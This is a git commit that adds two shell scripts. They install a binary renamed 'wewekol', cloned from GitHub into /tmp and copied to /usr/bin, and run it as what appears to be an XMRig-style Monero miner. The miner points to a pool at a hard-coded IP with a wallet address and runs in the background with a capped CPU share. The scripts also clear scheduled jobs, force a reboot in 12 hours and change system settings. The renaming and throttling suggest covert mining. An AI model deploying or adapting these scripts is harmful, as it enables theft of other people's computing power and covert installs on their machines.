fe217610d934063ae2f1a94e384bb41d71a26173
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-30 16:44:44 +0100

    Add files via upload

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill wewekol
+sleep 7
+wewekol -o 95.216.153.98:1456 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:koot@usa.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
---
+++ test502.sh
@@ -0,0 +1,40 @@
+#!/bin/bash
+
+ID="$(hostname)"
+
+THREADS="$(nproc --all)"
+
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+echo 'sudo reboot -f' | at now + 12 hours
+
+
+
+rm -rf /tmp/wewekol/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir wewekol
+git clone https://github.com/zinedrker/wewekol.git /tmp/wewekol
+cd /tmp/wewekol
+chmod +x /tmp/wewekol/wewekol
+chmod 777 ./*.sh
+cp /tmp/wewekol/wewekol /usr/bin/
+sleep 3
+
+
+sudo apt-get install dos2unix
+
+sudo dos2unix time1.sh
+sudo dos2unix 75.sh
+sudo dos2unix 50.sh
+sudo dos2unix 80.sh
+sudo dos2unix 65.sh
+sudo dos2unix 90.sh
+sudo dos2unix 40.sh
+
+sudo ./time1.sh
+
+
